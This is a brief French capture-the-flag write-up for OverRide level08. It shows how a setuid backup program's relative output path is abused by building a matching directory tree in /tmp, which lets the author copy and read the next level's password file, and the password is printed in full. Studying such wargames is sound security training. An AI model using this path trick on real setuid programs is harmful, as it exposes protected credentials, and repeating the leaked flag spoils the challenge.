Testons!

nous avons un fichier backups completement vide avec en fichier cache un .log qui est vide.

"
level08@OverRide:~$ ./level08
Usage: ./level08 filename
ERROR: Failed to open (null)
"

"
level08@OverRide:~$ ./level08 ~level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
"

notre programme prend en argument un fichier, il essaie de l'ouvrir en faisant "./backups//home/users/level09/.pass".

nous essayons de creer le pass.
"
level08@OverRide:~$ mkdir -p ./backups//home/users/level09
mkdir: cannot create directory `./backups//home': Permission denied
"

Interdit!

Donc nous essayons avec "/tmp"

"
level08@OverRide:~$ mkdir -p /tmp/backups//home/users/level09/
"

"
level08@OverRide:/tmp$ cd /tmp
level08@OverRide:/tmp$ ~/level08 ~level09/.pass
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
"

et nous appelons le programme
